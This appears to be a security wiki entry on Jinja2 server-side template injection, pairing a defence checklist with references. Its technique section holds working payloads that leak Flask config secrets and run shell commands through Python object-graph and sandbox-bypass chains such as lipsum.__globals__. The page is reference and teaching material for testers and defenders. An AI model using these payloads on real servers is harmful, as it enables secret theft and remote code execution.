---
title: Jinja2 SSTI Payload Chains
slug: python-ssti-jinja
---

> **TL;DR:** Jinja2 templates rendered with attacker-controlled source expose the full Python object graph; {% raw %}`{{ config }}`{% endraw %} leaks secrets and {% raw %}`{{ ''.__class__.__mro__[1].__subclasses__() }}`{% endraw %} reaches `Popen`.

## What it is
Server-side template injection in Jinja2 happens when a developer concatenates user input into a template string (`render_template_string(f"Hello {name}")`) instead of passing it as a variable. The Jinja sandbox blocks underscore-prefixed attributes by default, but globals like `lipsum`, `cycler`, `range`, and `namespace` carry references back to Python builtins.

## Preconditions / where it applies
- Flask/Quart `render_template_string`, Jinja2 `Environment().from_string(user)`
- Salt states, Ansible templates, Airflow macros with rendered user input
- Custom CMS where admins can edit templates without sandbox
- Bypass target: `SandboxedEnvironment`, autoescape, or denylist filters

## Technique
Start with detection, then leak, then pivot to RCE.

{% raw %}
```jinja2
{# detection #}
{{ 7*7 }}             {# -> 49 means evaluated #}
{{ 7*'7' }}           {# -> '7777777' confirms Python (vs Twig/ERB) #}

{# leak config secrets (Flask) #}
{{ config }}
{{ config.items() }}
{{ config['SECRET_KEY'] }}

{# class chain in stock Jinja #}
{{ ''.__class__.__mro__[1].__subclasses__() }}

{# pick subprocess.Popen by name, run a command #}
{{ ''.__class__.__mro__[1].__subclasses__()
   |selectattr('__name__','equalto','Popen')|list }}

{# stable globals path that survives sandbox %}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

{# statement form when {{ }} is filtered #}
{% set x = request.application.__globals__.__builtins__.__import__('os') %}
{% set y = x.popen('id').read() %}{{ y }}

{# underscore filtered? use |attr() #}
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1) }}
```
{% endraw %}

The `lipsum.__globals__['os']` chain is the most reliable on modern Flask because `lipsum` is auto-imported and not blocked by `SandboxedEnvironment`'s `is_safe_attribute`.

## Detection and defence
- Never pass user input as the template source — pass it as a context variable: `render_template_string("Hello {{ n }}", n=user)`
- Use `SandboxedEnvironment` and additionally remove `lipsum`, `cycler`, `namespace`, `range` from globals
- Add CSP and treat any 500 from a template render as a security event
- Lint: flag `render_template_string` / `from_string` whose first arg is not a string literal
- Audit hook on `subprocess.Popen` with caller-frame check for Jinja modules

## References
- [Jinja2 sandbox documentation](https://jinja.palletsprojects.com/en/stable/sandbox/) — what the sandbox does and does not block
- [PortSwigger SSTI research](https://portswigger.net/research/server-side-template-injection) — original taxonomy

See also: [[ssti]], [[python-sandbox-escape]], [[python-format-string]], [[python-dangerous-sinks]].
